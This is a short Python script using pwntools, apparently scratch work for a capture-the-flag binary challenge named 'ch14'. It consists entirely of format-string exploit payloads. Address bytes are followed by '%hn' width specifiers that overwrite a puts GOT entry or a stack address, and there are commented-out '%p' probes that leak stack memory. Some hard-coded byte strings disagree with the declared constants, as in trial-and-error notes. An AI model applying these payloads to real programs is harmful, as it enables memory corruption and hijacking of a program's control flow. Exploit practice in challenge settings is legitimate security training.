from pwn import *

target=p32(0x8420742)
putsGOT=0x08048512

# print '\x04\x08\x12\x85' + '\x04\x08\x12\x85' + '\x04\x08\x14\x85' + '\x04\x08\x14\x85' + '%1830x%8$hn' + '%256x%10$hn'
# print '\x42\x08\x20\x20' + '\x42\x08\x20\x20' + '\x42\x08\x22\x20' + '\x42\x08\x22\x20' + '%p-'*10
print '\x42\x08\x24\x20' + '\x42\x08\x24\x20' + '\x42\x08\x26\x20' + '\x42\x08\x26\x20' + '%1830x%8$hn' + '%268x%10$hn'
# print '\x04\x08\x12\x85' + '\x04\x08\x12\x85' + '\x04\x08\x14\x85' + '\x04\x08\x14\x85' + '%p-'*8
# print p32(putsGOT) + p32(putsGOT) + p32(putsGOT+2) + p32(putsGOT+2) + '%p-'*10
# print p32(putsGOT) + p32(putsGOT+2) + '%1854x%8\\$hn' + '%256x%10\\$hn'
# ./ch14 $(python -c "print('\xc8\xfa\xff\xbf' + '\xca\xfa\xff\xbf' + '%48871x%9\$hn' + '%8126x%10\$hn' )")
